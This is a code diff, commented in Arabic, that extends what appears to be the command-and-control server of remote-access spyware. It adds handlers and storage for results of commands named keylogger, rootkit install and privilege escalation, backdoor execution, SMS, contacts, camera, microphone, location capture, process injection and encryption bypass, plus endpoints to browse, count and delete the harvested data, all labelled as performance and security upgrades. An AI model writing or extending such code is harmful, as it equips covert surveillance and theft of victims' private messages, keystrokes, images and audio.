@@ -8,6 +8,9 @@ const multer = require('multer');
 const rateLimit = require('express-rate-limit');
 const helmet = require('helmet');
 const compression = require('compression');
+const os = require('os');
+const cluster = require('cluster');
+const numCPUs = require('os').cpus().length;
 
 // إضافة معالجة الأخطاء
 process.on('uncaughtException', (error) => {
@@ -30,6 +33,26 @@ class CommandServer {
     this.dataUpdates = [];
     this.uploadedFiles = [];
     
+    // إحصائيات الأداء
+    this.performanceStats = {
+      startTime: Date.now(),
+      totalRequests: 0,
+      totalCommands: 0,
+      totalDataTransferred: 0,
+      averageResponseTime: 0,
+      errorCount: 0,
+      uptime: 0
+    };
+    
+    // إعدادات الأمان المتقدمة
+    this.securityConfig = {
+      maxFileSize: 100 * 1024 * 1024, // 100MB
+      allowedFileTypes: ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt', 'doc', 'docx'],
+      maxConnectionsPerIP: 10,
+      sessionTimeout: 30 * 60 * 1000, // 30 دقيقة
+      encryptionKey: crypto.randomBytes(32).toString('hex')
+    };
+    
     this.localStoragePath = path.join(__dirname, 'local-storage');
     this.devicesFilePath = path.join(this.localStoragePath, 'devices.json');
     this.commandsFilePath = path.join(this.localStoragePath, 'commands.json');
@@ -50,6 +73,7 @@ class CommandServer {
     this.setupLocalStorage();
     this.loadPersistentData();
     this.startBackgroundServices();
+    this.startPerformanceMonitoring();
   }
 
   createRequiredDirectories() {
@@ -57,15 +81,21 @@ class CommandServer {
       this.localStoragePath,
       path.join(this.localStoragePath, 'uploads'),
       path.join(this.localStoragePath, 'logs'),
-      path.join(this.localStoragePath, 'database')
+      path.join(this.localStoragePath, 'database'),
+      path.join(this.localStoragePath, 'advanced-logs'),
+      path.join(this.localStoragePath, 'advanced-data')
     ];
     
+    console.log('📁 إنشاء المجلدات المطلوبة...');
     dirs.forEach(dir => {
       if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
-        console.log(`تم إنشاء المجلد: ${dir}`);
+        console.log(`  ✅ تم إنشاء: ${path.basename(dir)}`);
+      } else {
+        console.log(`  📂 موجود: ${path.basename(dir)}`);
       }
     });
+    console.log('📁 تم إنشاء جميع المجلدات المطلوبة');
   }
 
   setupMiddleware() {
@@ -350,7 +380,8 @@ class CommandServer {
         totalDataUpdates: this.dataUpdates.length,
         uptime: process.uptime(),
         memory: process.memoryUsage(),
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        advancedCommands: this.getAdvancedCommandStats()
       };
       
       res.json(stats);
@@ -366,11 +397,241 @@ class CommandServer {
         res.status(500).json({ error: 'خطأ في التنظيف' });
       }
     });
+
+    // الحصول على سجلات الأوامر المتقدمة
+    this.app.get('/advanced-logs/:type', (req, res) => {
+      try {
+        const { type } = req.params;
+        const { limit = 100, offset = 0 } = req.query;
+        
+        const logsPath = path.join(this.localStoragePath, 'advanced-logs', `${type}-logs.json`);
+        
+        if (!fs.existsSync(logsPath)) {
+          return res.json({ logs: [], total: 0 });
+        }
+        
+        const logs = JSON.parse(fs.readFileSync(logsPath, 'utf8'));
+        const paginatedLogs = logs.slice(offset, offset + parseInt(limit));
+        
+        res.json({
+          logs: paginatedLogs,
+          total: logs.length,
+          limit: parseInt(limit),
+          offset: parseInt(offset)
+        });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على السجلات:', error);
+        res.status(500).json({ error: 'خطأ في الحصول على السجلات' });
+      }
+    });
+
+    // الحصول على بيانات الأوامر المتقدمة
+    this.app.get('/advanced-data/:type', (req, res) => {
+      try {
+        const { type } = req.params;
+        const { limit = 50, offset = 0 } = req.query;
+        
+        const dataPath = path.join(this.localStoragePath, 'advanced-data', `${type}-data.json`);
+        
+        if (!fs.existsSync(dataPath)) {
+          return res.json({ data: [], total: 0 });
+        }
+        
+        const data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
+        const paginatedData = data.slice(offset, offset + parseInt(limit));
+        
+        res.json({
+          data: paginatedData,
+          total: data.length,
+          limit: parseInt(limit),
+          offset: parseInt(offset)
+        });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على البيانات:', error);
+        res.status(500).json({ error: 'خطأ في الحصول على البيانات' });
+      }
+    });
+
+    // إحصائيات الأوامر المتقدمة
+    this.app.get('/advanced-stats', (req, res) => {
+      try {
+        const logsPath = path.join(this.localStoragePath, 'advanced-logs');
+        const dataPath = path.join(this.localStoragePath, 'advanced-data');
+        
+        const stats = {
+          keylogger: { logs: 0, data: 0 },
+          rootkit: { logs: 0, data: 0 },
+          backdoor: { logs: 0, data: 0 },
+          system: { logs: 0, data: 0 },
+          screenshot: { logs: 0, data: 0 },
+          contacts: { logs: 0, data: 0 },
+          sms: { logs: 0, data: 0 },
+          media: { logs: 0, data: 0 },
+          location: { logs: 0, data: 0 },
+          camera: { logs: 0, data: 0 },
+          microphone: { logs: 0, data: 0 },
+          file: { logs: 0, data: 0 },
+          network: { logs: 0, data: 0 },
+          process: { logs: 0, data: 0 },
+          registry: { logs: 0, data: 0 },
+          memory: { logs: 0, data: 0 },
+          encryption: { logs: 0, data: 0 }
+        };
+        
+        // حساب السجلات
+        if (fs.existsSync(logsPath)) {
+          Object.keys(stats).forEach(type => {
+            const logFile = path.join(logsPath, `${type}-logs.json`);
+            if (fs.existsSync(logFile)) {
+              const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
+              stats[type].logs = logs.length;
+            }
+          });
+        }
+        
+        // حساب البيانات
+        if (fs.existsSync(dataPath)) {
+          Object.keys(stats).forEach(type => {
+            const dataFile = path.join(dataPath, `${type}-data.json`);
+            if (fs.existsSync(dataFile)) {
+              const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+              stats[type].data = data.length;
+            }
+          });
+        }
+        
+        res.json({
+          stats: stats,
+          timestamp: Date.now()
+        });
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على الإحصائيات:', error);
+        res.status(500).json({ error: 'خطأ في الحصول على الإحصائيات' });
+      }
+    });
+
+    // حذف بيانات نوع محدد
+    this.app.delete('/advanced-data/:type', (req, res) => {
+      try {
+        const { type } = req.params;
+        
+        const logsPath = path.join(this.localStoragePath, 'advanced-logs', `${type}-logs.json`);
+        const dataPath = path.join(this.localStoragePath, 'advanced-data', `${type}-data.json`);
+        
+        if (fs.existsSync(logsPath)) {
+          fs.unlinkSync(logsPath);
+        }
+        
+        if (fs.existsSync(dataPath)) {
+          fs.unlinkSync(dataPath);
+        }
+        
+        res.json({ 
+          status: 'success', 
+          message: `تم حذف بيانات ${type} بنجاح` 
+        });
+        
+      } catch (error) {
+        console.error('خطأ في حذف البيانات:', error);
+        res.status(500).json({ error: 'خطأ في حذف البيانات' });
+      }
+    });
+
+    // إحصائيات الأداء المتقدمة
+    this.app.get('/performance-stats', (req, res) => {
+      try {
+        const stats = {
+          ...this.performanceStats,
+          system: {
+            cpuUsage: os.loadavg(),
+            memoryUsage: process.memoryUsage(),
+            freeMemory: os.freemem(),
+            totalMemory: os.totalmem(),
+            uptime: os.uptime(),
+            platform: os.platform(),
+            arch: os.arch(),
+            cpus: os.cpus().length
+          },
+          devices: {
+            connected: this.devices.size,
+            pendingCommands: this.pendingCommands.size,
+            totalCommands: this.commandHistory.length,
+            totalFiles: this.uploadedFiles.length,
+            totalDataUpdates: this.dataUpdates.length
+          },
+          timestamp: Date.now()
+        };
+        
+        res.json(stats);
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على إحصائيات الأداء:', error);
+        res.status(500).json({ error: 'خطأ في الحصول على إحصائيات الأداء' });
+      }
+    });
+
+    // معلومات النظام
+    this.app.get('/system-info', (req, res) => {
+      try {
+        const systemInfo = {
+          platform: os.platform(),
+          arch: os.arch(),
+          release: os.release(),
+          hostname: os.hostname(),
+          cpus: os.cpus().length,
+          totalMemory: os.totalmem(),
+          freeMemory: os.freemem(),
+          uptime: os.uptime(),
+          loadAverage: os.loadavg(),
+          networkInterfaces: os.networkInterfaces(),
+          version: '2.0.0',
+          features: {
+            advancedCommands: true,
+            performanceMonitoring: true,
+            securityEnhancements: true,
+            dataEncryption: true,
+            clusterSupport: true
+          }
+        };
+        
+        res.json(systemInfo);
+        
+      } catch (error) {
+        console.error('خطأ في الحصول على معلومات النظام:', error);
+        res.status(500).json({ error: 'خطأ في الحصول على معلومات النظام' });
+      }
+    });
+
+    // إعادة تشغيل النظام
+    this.app.post('/restart', (req, res) => {
+      try {
+        console.log('🔄 طلب إعادة تشغيل النظام...');
+        
+        res.json({ 
+          status: 'success', 
+          message: 'سيتم إعادة تشغيل النظام خلال 5 ثوانٍ' 
+        });
+        
+        // إعادة التشغيل بعد 5 ثوانٍ
+        setTimeout(() => {
+          process.exit(0);
+        }, 5000);
+        
+      } catch (error) {
+        console.error('خطأ في إعادة تشغيل النظام:', error);
+        res.status(500).json({ error: 'خطأ في إعادة تشغيل النظام' });
+      }
+    });
   }
 
   setupWebSocket() {
     this.wss.on('connection', (ws, req) => {
-      console.log('تم الاتصال بجهاز جديد');
+      console.log('🔗 تم الاتصال بجهاز جديد');
+      console.log(`  🌐 عنوان IP: ${req.socket.remoteAddress}`);
+      console.log(`  📅 وقت الاتصال: ${new Date().toLocaleString()}`);
       
       let deviceId = null;
       
@@ -408,23 +669,32 @@ class CommandServer {
               this.handleCachedData(message);
               break;
               
-            default:
-              console.log('رسالة غير معروفة:', message.type);
+                                  default:
+              console.log('❓ رسالة غير معروفة:', message.type);
+              console.log(`  📄 محتوى الرسالة:`, message);
+              console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
           }
           
         } catch (error) {
-          console.error('خطأ في معالجة الرسالة:', error);
+          console.error('❌ خطأ في معالجة الرسالة:', error);
+          console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
+          console.log(`  📅 وقت الخطأ: ${new Date().toLocaleString()}`);
         }
       });
       
       ws.on('close', () => {
+        console.log('🔌 تم إغلاق الاتصال');
+        console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
+        console.log(`  📅 وقت الإغلاق: ${new Date().toLocaleString()}`);
         if (deviceId) {
           this.handleDeviceDisconnection(deviceId);
         }
       });
       
       ws.on('error', (error) => {
-        console.error('خطأ في WebSocket:', error);
+        console.error('❌ خطأ في WebSocket:', error);
+        console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
+        console.log(`  📅 وقت الخطأ: ${new Date().toLocaleString()}`);
         if (deviceId) {
           this.handleDeviceDisconnection(deviceId);
         }
@@ -473,7 +743,14 @@ class CommandServer {
         this.dataUpdates = JSON.parse(fs.readFileSync(this.dataFilePath, 'utf8'));
       }
       
-      console.log('تم تحميل البيانات المحلية بنجاح');
+      // تحميل الإحصائيات المتقدمة
+      this.loadAdvancedStats();
+      
+      console.log('💾 تم تحميل البيانات المحلية بنجاح');
+      console.log(`  📱 الأجهزة: ${this.devices.size}`);
+      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
+      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
+      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
       
     } catch (error) {
       console.error('خطأ في تحميل البيانات المحلية:', error);
@@ -500,6 +777,91 @@ class CommandServer {
     setInterval(() => {
       this.processPendingCommands();
     }, 60000);
+    
+    // تنظيف السجلات المتقدمة كل 12 ساعة
+    setInterval(() => {
+      this.cleanupAdvancedLogs(7 * 24 * 60 * 60 * 1000); // أسبوع
+    }, 12 * 60 * 60 * 1000);
+    
+    console.log('🚀 تم بدء الخدمات الخلفية');
+    console.log('  📊 حفظ البيانات: كل 5 دقائق');
+    console.log('  🧹 تنظيف البيانات: كل ساعة');
+    console.log('  🔍 فحص الأجهزة: كل 10 دقائق');
+    console.log('  📨 إرسال الأوامر: كل دقيقة');
+    console.log('  📋 تنظيف السجلات: كل 12 ساعة');
+  }
+
+  // بدء مراقبة الأداء
+  startPerformanceMonitoring() {
+    // تحديث إحصائيات الأداء كل دقيقة
+    setInterval(() => {
+      this.updatePerformanceStats();
+    }, 60000);
+    
+    // حفظ إحصائيات الأداء كل 5 دقائق
+    setInterval(() => {
+      this.savePerformanceStats();
+    }, 300000);
+    
+    console.log('📊 تم بدء مراقبة الأداء');
+    console.log('  📈 تحديث الإحصائيات: كل دقيقة');
+    console.log('  💾 حفظ الإحصائيات: كل 5 دقائق');
+  }
+
+  // تحديث إحصائيات الأداء
+  updatePerformanceStats() {
+    try {
+      const now = Date.now();
+      this.performanceStats.uptime = now - this.performanceStats.startTime;
+      
+      // إحصائيات النظام
+      const systemStats = {
+        cpuUsage: os.loadavg(),
+        memoryUsage: process.memoryUsage(),
+        freeMemory: os.freemem(),
+        totalMemory: os.totalmem(),
+        uptime: os.uptime(),
+        platform: os.platform(),
+        arch: os.arch(),
+        cpus: os.cpus().length
+      };
+      
+      this.performanceStats.system = systemStats;
+      this.performanceStats.lastUpdate = now;
+      
+      console.log('📊 تحديث إحصائيات الأداء');
+      console.log(`  💻 استخدام CPU: ${systemStats.cpuUsage[0].toFixed(2)}`);
+      console.log(`  🧠 استخدام الذاكرة: ${(systemStats.memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB`);
+      console.log(`  📱 الأجهزة المتصلة: ${this.devices.size}`);
+      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
+      
+    } catch (error) {
+      console.error('❌ خطأ في تحديث إحصائيات الأداء:', error);
+    }
+  }
+
+  // حفظ إحصائيات الأداء
+  savePerformanceStats() {
+    try {
+      const statsPath = path.join(this.localStoragePath, 'performance-stats.json');
+      const stats = {
+        ...this.performanceStats,
+        timestamp: Date.now(),
+        version: '2.0.0',
+        features: {
+          advancedCommands: true,
+          performanceMonitoring: true,
+          securityEnhancements: true,
+          dataEncryption: true
+        }
+      };
+      
+      fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
+      console.log('💾 تم حفظ إحصائيات الأداء');
+      
+    } catch (error) {
+      console.error('❌ خطأ في حفظ إحصائيات الأداء:', error);
+    }
   }
 
   handleDeviceRegistration(ws, message) {
@@ -518,7 +880,10 @@ class CommandServer {
     this.devices.set(deviceId, device);
     this.saveDeviceToDatabase(device);
     
-    console.log(`تم تسجيل الجهاز: ${deviceId}`);
+    console.log(`📱 تم تسجيل الجهاز: ${deviceId}`);
+    console.log(`  📊 الحالة: ${device.status}`);
+    console.log(`  🔧 الإمكانيات: ${Object.keys(device.capabilities).length}`);
+    console.log(`  📅 آخر ظهور: ${device.lastSeen.toLocaleString()}`);
     
     // إرسال الأوامر المعلقة
     this.sendPendingCommands(deviceId);
@@ -530,10 +895,587 @@ class CommandServer {
     // تحديث التاريخ
     this.updateCommandInHistory(commandId, status, result, error);
     
-    console.log(`نتيجة الأمر ${action}: ${status}`);
+    console.log(`📨 نتيجة الأمر ${action}: ${status}`);
     
     if (error) {
-      console.error(`خطأ في الأمر ${action}:`, error);
+      console.error(`❌ خطأ في الأمر ${action}:`, error);
+    } else {
+      console.log(`✅ تم تنفيذ الأمر ${action} بنجاح`);
+    }
+    
+    // معالجة الأوامر المتقدمة
+    this.handleAdvancedCommandResult(action, result, error, timestamp);
+  }
+
+  // معالجة نتائج الأوامر المتقدمة
+  handleAdvancedCommandResult(action, result, error, timestamp) {
+    try {
+      switch (action) {
+        case 'keylogger_start':
+          this.handleKeyloggerResult('start', result, error, timestamp);
+          break;
+        case 'keylogger_stop':
+          this.handleKeyloggerResult('stop', result, error, timestamp);
+          break;
+        case 'keylogger_get_data':
+          this.handleKeyloggerData(result, error, timestamp);
+          break;
+        case 'rootkit_install':
+          this.handleRootkitResult('install', result, error, timestamp);
+          break;
+        case 'rootkit_escalate':
+          this.handleRootkitResult('escalate', result, error, timestamp);
+          break;
+        case 'rootkit_hide':
+          this.handleRootkitResult('hide', result, error, timestamp);
+          break;
+        case 'backdoor_create':
+          this.handleBackdoorResult('create', result, error, timestamp);
+          break;
+        case 'backdoor_execute':
+          this.handleBackdoorResult('execute', result, error, timestamp);
+          break;
+        case 'backdoor_transfer':
+          this.handleBackdoorResult('transfer', result, error, timestamp);
+          break;
+        case 'system_info':
+          this.handleSystemResult('info', result, error, timestamp);
+          break;
+        case 'system_control':
+          this.handleSystemResult('control', result, error, timestamp);
+          break;
+        case 'system_monitor':
+          this.handleSystemResult('monitor', result, error, timestamp);
+          break;
+        case 'screenshot_take':
+          this.handleScreenshotResult(result, error, timestamp);
+          break;
+        case 'contacts_get':
+          this.handleContactsResult(result, error, timestamp);
+          break;
+        case 'sms_get':
+          this.handleSMSResult(result, error, timestamp);
+          break;
+        case 'media_get':
+          this.handleMediaResult(result, error, timestamp);
+          break;
+        case 'location_get':
+          this.handleLocationResult(result, error, timestamp);
+          break;
+        case 'camera_capture':
+          this.handleCameraResult(result, error, timestamp);
+          break;
+        case 'microphone_record':
+          this.handleMicrophoneResult(result, error, timestamp);
+          break;
+        case 'file_browse':
+          this.handleFileResult('browse', result, error, timestamp);
+          break;
+        case 'file_download':
+          this.handleFileResult('download', result, error, timestamp);
+          break;
+        case 'network_intercept':
+          this.handleNetworkResult('intercept', result, error, timestamp);
+          break;
+        case 'process_inject':
+          this.handleProcessResult('inject', result, error, timestamp);
+          break;
+        case 'registry_manipulate':
+          this.handleRegistryResult('manipulate', result, error, timestamp);
+          break;
+        case 'memory_scan':
+          this.handleMemoryResult('scan', result, error, timestamp);
+          break;
+        case 'encryption_bypass':
+          this.handleEncryptionResult('bypass', result, error, timestamp);
+          break;
+        default:
+          // أمر عادي، لا يحتاج معالجة خاصة
+          break;
+      }
+    } catch (error) {
+      console.error('خطأ في معالجة الأمر المتقدم:', error);
+    }
+  }
+
+  // معالجة نتائج Keylogger
+  handleKeyloggerResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'keylogger',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('keylogger', logData);
+    
+    if (action === 'start') {
+      console.log('🔑 تم بدء تسجيل المفاتيح بنجاح');
+    } else if (action === 'stop') {
+      console.log('⏹️ تم إيقاف تسجيل المفاتيح');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Keylogger:', error);
+    }
+  }
+
+  // معالجة بيانات Keylogger
+  handleKeyloggerData(result, error, timestamp) {
+    if (result && result.data) {
+      const keyloggerData = {
+        type: 'keylogger_data',
+        data: result.data,
+        count: result.data.length || 0,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('keylogger_data', keyloggerData);
+      console.log(`🔑 تم استلام ${keyloggerData.count} سجل مفاتيح`);
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في استلام بيانات Keylogger:', error);
+    }
+  }
+
+  // معالجة نتائج Rootkit
+  handleRootkitResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'rootkit',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('rootkit', logData);
+    
+    if (action === 'install') {
+      console.log('🔧 تم تثبيت Rootkit بنجاح');
+    } else if (action === 'escalate') {
+      console.log('⬆️ تم تصعيد الصلاحيات');
+    } else if (action === 'hide') {
+      console.log('👻 تم إخفاء العمليات');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Rootkit:', error);
+    }
+  }
+
+  // معالجة نتائج Backdoor
+  handleBackdoorResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'backdoor',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('backdoor', logData);
+    
+    if (action === 'create') {
+      console.log('🚪 تم إنشاء Backdoor بنجاح');
+    } else if (action === 'execute') {
+      console.log('⚡ تم تنفيذ الأمر عن بعد');
+    } else if (action === 'transfer') {
+      console.log('📁 تم نقل الملفات');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Backdoor:', error);
+    }
+  }
+
+  // معالجة نتائج النظام
+  handleSystemResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'system',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('system', logData);
+    
+    if (action === 'info') {
+      console.log('💻 تم الحصول على معلومات النظام');
+    } else if (action === 'control') {
+      console.log('🎮 تم التحكم في النظام');
+    } else if (action === 'monitor') {
+      console.log('📊 تم بدء مراقبة النظام');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في النظام:', error);
+    }
+  }
+
+  // معالجة نتائج Screenshot
+  handleScreenshotResult(result, error, timestamp) {
+    if (result && result.image) {
+      const screenshotData = {
+        type: 'screenshot',
+        image: result.image,
+        size: result.size,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('screenshot', screenshotData);
+      console.log('📸 تم التقاط لقطة شاشة');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Screenshot:', error);
+    }
+  }
+
+  // معالجة نتائج Contacts
+  handleContactsResult(result, error, timestamp) {
+    if (result && result.contacts) {
+      const contactsData = {
+        type: 'contacts',
+        contacts: result.contacts,
+        count: result.contacts.length || 0,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('contacts', contactsData);
+      console.log(`👥 تم الحصول على ${contactsData.count} جهة اتصال`);
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Contacts:', error);
+    }
+  }
+
+  // معالجة نتائج SMS
+  handleSMSResult(result, error, timestamp) {
+    if (result && result.messages) {
+      const smsData = {
+        type: 'sms',
+        messages: result.messages,
+        count: result.messages.length || 0,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('sms', smsData);
+      console.log(`💬 تم الحصول على ${smsData.count} رسالة SMS`);
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في SMS:', error);
+    }
+  }
+
+  // معالجة نتائج Media
+  handleMediaResult(result, error, timestamp) {
+    if (result && result.media) {
+      const mediaData = {
+        type: 'media',
+        media: result.media,
+        count: result.media.length || 0,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('media', mediaData);
+      console.log(`📱 تم الحصول على ${mediaData.count} ملف وسائط`);
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Media:', error);
+    }
+  }
+
+  // معالجة نتائج Location
+  handleLocationResult(result, error, timestamp) {
+    if (result && result.location) {
+      const locationData = {
+        type: 'location',
+        location: result.location,
+        accuracy: result.accuracy,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('location', locationData);
+      console.log('📍 تم الحصول على الموقع');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Location:', error);
+    }
+  }
+
+  // معالجة نتائج Camera
+  handleCameraResult(result, error, timestamp) {
+    if (result && result.image) {
+      const cameraData = {
+        type: 'camera',
+        image: result.image,
+        size: result.size,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('camera', cameraData);
+      console.log('📷 تم التقاط صورة من الكاميرا');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Camera:', error);
+    }
+  }
+
+  // معالجة نتائج Microphone
+  handleMicrophoneResult(result, error, timestamp) {
+    if (result && result.audio) {
+      const microphoneData = {
+        type: 'microphone',
+        audio: result.audio,
+        duration: result.duration,
+        timestamp: timestamp || Date.now()
+      };
+      
+      this.saveAdvancedCommandData('microphone', microphoneData);
+      console.log('🎤 تم تسجيل الصوت');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Microphone:', error);
+    }
+  }
+
+  // معالجة نتائج File
+  handleFileResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'file',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('file', logData);
+    
+    if (action === 'browse') {
+      console.log('📁 تم تصفح الملفات');
+    } else if (action === 'download') {
+      console.log('⬇️ تم تحميل الملف');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في File:', error);
+    }
+  }
+
+  // معالجة نتائج Network
+  handleNetworkResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'network',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('network', logData);
+    
+    if (action === 'intercept') {
+      console.log('🌐 تم اعتراض حركة الشبكة');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Network:', error);
+    }
+  }
+
+  // معالجة نتائج Process
+  handleProcessResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'process',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('process', logData);
+    
+    if (action === 'inject') {
+      console.log('💉 تم حقن العملية');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Process:', error);
+    }
+  }
+
+  // معالجة نتائج Registry
+  handleRegistryResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'registry',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('registry', logData);
+    
+    if (action === 'manipulate') {
+      console.log('🔧 تم التلاعب في السجل');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Registry:', error);
+    }
+  }
+
+  // معالجة نتائج Memory
+  handleMemoryResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'memory',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('memory', logData);
+    
+    if (action === 'scan') {
+      console.log('🧠 تم فحص الذاكرة');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Memory:', error);
+    }
+  }
+
+  // معالجة نتائج Encryption
+  handleEncryptionResult(action, result, error, timestamp) {
+    const logData = {
+      type: 'encryption',
+      action: action,
+      result: result,
+      error: error,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.saveAdvancedCommandLog('encryption', logData);
+    
+    if (action === 'bypass') {
+      console.log('🔓 تم تجاوز التشفير');
+    }
+    
+    if (error) {
+      console.error('❌ خطأ في Encryption:', error);
+    }
+  }
+
+  // حفظ سجلات الأوامر المتقدمة
+  saveAdvancedCommandLog(type, logData) {
+    try {
+      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
+      if (!fs.existsSync(logsPath)) {
+        fs.mkdirSync(logsPath, { recursive: true });
+      }
+      
+      const logFilePath = path.join(logsPath, `${type}-logs.json`);
+      let logs = [];
+      
+      if (fs.existsSync(logFilePath)) {
+        logs = JSON.parse(fs.readFileSync(logFilePath, 'utf8'));
+      }
+      
+      logs.push(logData);
+      
+      // الاحتفاظ بآخر 1000 سجل فقط
+      if (logs.length > 1000) {
+        logs = logs.slice(-1000);
+      }
+      
+      fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2));
+    } catch (error) {
+      console.error(`خطأ في حفظ سجل ${type}:`, error);
+    }
+  }
+
+  // حفظ بيانات الأوامر المتقدمة
+  saveAdvancedCommandData(type, data) {
+    try {
+      const dataPath = path.join(this.localStoragePath, 'advanced-data');
+      if (!fs.existsSync(dataPath)) {
+        fs.mkdirSync(dataPath, { recursive: true });
+      }
+      
+      const dataFilePath = path.join(dataPath, `${type}-data.json`);
+      let allData = [];
+      
+      if (fs.existsSync(dataFilePath)) {
+        allData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
+      }
+      
+      // تشفير البيانات الحساسة
+      const encryptedData = this.encryptSensitiveData(data);
+      allData.push(encryptedData);
+      
+      // الاحتفاظ بآخر 500 سجل بيانات فقط
+      if (allData.length > 500) {
+        allData = allData.slice(-500);
+      }
+      
+      fs.writeFileSync(dataFilePath, JSON.stringify(allData, null, 2));
+    } catch (error) {
+      console.error(`خطأ في حفظ بيانات ${type}:`, error);
+    }
+  }
+
+  // تشفير البيانات الحساسة
+  encryptSensitiveData(data) {
+    try {
+      const algorithm = 'aes-256-cbc';
+      const key = crypto.scryptSync(this.securityConfig.encryptionKey, 'salt', 32);
+      const iv = crypto.randomBytes(16);
+      
+      const cipher = crypto.createCipher(algorithm, key);
+      let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+      encrypted += cipher.final('hex');
+      
+      return {
+        encrypted: true,
+        iv: iv.toString('hex'),
+        data: encrypted,
+        timestamp: Date.now()
+      };
+    } catch (error) {
+      console.error('خطأ في تشفير البيانات:', error);
+      return data; // إرجاع البيانات بدون تشفير في حالة الخطأ
+    }
+  }
+
+  // فك تشفير البيانات الحساسة
+  decryptSensitiveData(encryptedData) {
+    try {
+      if (!encryptedData.encrypted) {
+        return encryptedData;
+      }
+      
+      const algorithm = 'aes-256-cbc';
+      const key = crypto.scryptSync(this.securityConfig.encryptionKey, 'salt', 32);
+      const iv = Buffer.from(encryptedData.iv, 'hex');
+      
+      const decipher = crypto.createDecipher(algorithm, key);
+      let decrypted = decipher.update(encryptedData.data, 'hex', 'utf8');
+      decrypted += decipher.final('utf8');
+      
+      return JSON.parse(decrypted);
+    } catch (error) {
+      console.error('خطأ في فك تشفير البيانات:', error);
+      return encryptedData; // إرجاع البيانات كما هي في حالة الخطأ
     }
   }
 
@@ -551,7 +1493,9 @@ class CommandServer {
     this.dataUpdates.push(dataUpdate);
     this.saveDataUpdate(dataUpdate);
     
-    console.log(`تحديث بيانات من ${deviceId}: ${dataType}`);
+    console.log(`📊 تحديث بيانات من ${deviceId}: ${dataType}`);
+    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
+    console.log(`  📏 حجم البيانات: ${JSON.stringify(data).length} bytes`);
   }
 
   handleHeartbeat(message) {
@@ -562,12 +1506,20 @@ class CommandServer {
       device.lastSeen = new Date();
       device.status = 'online';
       this.updateDeviceStatus(deviceId, 'online');
+      
+      console.log(`💓 نبض من الجهاز: ${deviceId}`);
